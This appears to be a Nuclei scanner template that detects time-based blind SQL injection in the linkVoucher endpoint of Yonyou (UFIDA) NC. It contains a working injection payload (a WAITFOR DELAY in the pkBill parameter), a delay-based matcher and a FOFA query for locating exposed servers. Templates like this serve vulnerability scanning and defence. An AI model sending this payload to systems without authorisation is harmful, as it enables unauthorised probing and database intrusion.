id: YYNC-linkVoucher-SQL

info:
  name: YYNC-linkVoucher-SQL
  author: lengmo
  severity: high
  description: YYNC-linkVoucher-SQL
  tags: sqli
  metadata:
    fofa-qeury: app="用友-UFIDA-NC"
    veified: true
    max-request: 1

http:
  - raw:
      - |
        @timeout: 10s
        GET /portal/pt/yercommon/linkVoucher?pageId=login&pkBill=1'waitfor+delay+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
               
    matchers:     
      - type: dsl
        dsl:
          - "status_code == 200 && duration>=5 && duration<=15 && contains(header,'text/html')" 